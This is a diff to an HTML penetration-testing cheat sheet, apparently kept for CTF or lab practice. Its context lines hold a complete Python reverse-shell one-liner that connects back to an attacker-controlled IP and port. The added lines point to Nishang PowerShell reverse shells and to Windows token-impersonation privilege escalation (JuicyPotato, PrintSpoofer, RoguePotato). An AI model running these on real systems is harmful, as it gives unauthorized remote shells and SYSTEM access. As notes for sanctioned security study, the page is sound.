@@ -86,8 +86,8 @@
 <p id="info">Python Reverse Shell #1</p>
 <p id="codebox">import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALIIP",$KALIPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")</p>
 
-<p id="info"></p>
-<p id="codebox"></p>
+<p id="info">Nishang Powershell reverse shells</p>
+<p id="codebox">BankRobber-36:00</p>
 
 
 
@@ -386,6 +386,13 @@ rpcclient $> exit
     C:\Windows\SysNative\ = 64 bit binary libraries</p>
 
 <h3>Juicy Potato - ImpersonatePrivilege and/or SeAssignPrimaryTokenPrivilege enabled</h3>
+If JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer, RoguePotato, SharpEfsPotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access. This blog post goes in-depth on the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works
+
+<p id="info">ippsec has a good video on how to get rogue potato to work (Worker)</p>
+
+<p id="codebox"><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">JuicyPotato</a></p>
+<p id="codebox"><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer">RoguePotato, PrintSpoofer, SharpEfsPotato</a></p>
+
 <p id="info">Check to see if they are enabled</p>
 <p id="codebox">whoami /priv</p>
 <p id="codebox">whoami /all</p>
